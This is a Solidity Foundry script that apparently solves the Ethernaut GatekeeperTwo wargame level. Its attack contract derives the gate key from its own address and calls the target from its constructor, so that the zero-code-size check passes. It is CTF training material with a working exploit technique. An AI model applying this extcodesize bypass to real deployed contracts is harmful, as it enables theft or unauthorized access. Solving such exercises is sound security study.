//SPDX-License-Identifier:UNLICENSED
pragma solidity ^0.8.0;

import "../src/GatekeeperTwo.sol";
import "forge-std/Script.sol";

contract AttackGatekeeperTwo {
    constructor(GatekeeperTwo _gatekeeperTwo) public {
        uint64 key = uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max;
        _gatekeeperTwo.enter(bytes8(key));
    }
}

contract GatekeeperTwoSolution is Script {
    GatekeeperTwo _gatekeeperTwo = GatekeeperTwo(0x7358B397eFa74Adc45d2397dcefb14580e2cD960);

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new AttackGatekeeperTwo(_gatekeeperTwo);
        vm.stopBroadcast();
    }
}